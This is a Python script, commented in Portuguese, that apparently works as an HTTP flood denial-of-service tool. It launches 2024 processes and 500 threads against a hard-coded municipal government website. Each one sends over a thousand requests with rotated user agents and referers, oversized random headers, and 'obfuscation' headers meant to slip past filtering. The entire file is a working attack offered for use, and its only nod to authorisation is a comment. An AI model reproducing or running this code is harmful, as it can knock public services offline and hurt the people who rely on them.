import requests
import random
import time
import multiprocessing
import threading

def read_user_agents():
    with open("useragents.txt", "r") as file:
        return file.read().splitlines()

def read_referers():
    with open("referers.txt", "r") as file:
        return file.read().splitlines()

def generate_large_headers():
    # Gerar cabeçalhos grandes com 1000 caracteres para cada chave-valor
    headers = {}
    for i in range(10):  # 10 chaves-valor
        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=990))  # Valor com 990 caracteres
        headers[key] = value
    return headers

def generate_smart_obfuscation_headers():
    headers = {}
    for _ in range(10):  # Gerar 10 pares chave-valor
        key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))  # Chave aleatória
        value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+', k=20))  # Valor aleatório
        headers[key] = value
    return headers

def send_request(url, user_agents, referers, num_requests):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': random.choice(referers)
    }
    headers.update(generate_large_headers())  # Adicionar cabeçalhos grandes
    headers.update(generate_smart_obfuscation_headers())  # Adicionar cabeçalhos de ofuscação inteligente

    try:
        with requests.Session() as session:
            session.headers.update(headers)
            for _ in range(num_requests):
                response = session.get(url)
                print(f"Response from {url}: {response.status_code}")
    except Exception as e:
        print(f"Error accessing {url}: {str(e)}")

def main():
    url = "https://www.guaruja.sp.gov.br/"  # Substitua com o site autorizado
    user_agents = read_user_agents()
    referers = read_referers()
    num_processes = 2024
    num_threads = 500
    num_requests_per_thread = 1014  # Aumentado para 1014 solicitações por thread/processo
    duration = 300  # segundos

    start_time = time.time()

    # Usando multiprocessing para enviar requisições simultaneamente
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=send_request, args=(url, user_agents, referers, num_requests_per_thread))
        p.start()
        processes.append(p)

    # Usando threading para enviar requisições simultaneamente
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, user_agents, referers, num_requests_per_thread))
        t.start()
        threads.append(t)

    # Aguarda até que todas as threads e processos terminem ou até atingir a duração máxima
    for p in processes:
        p.join()

    for t in threads:
        t.join()

    end_time = time.time()
    print(f"Total time taken: {end_time - start_time} seconds")

if __name__ == "__main__":
    main()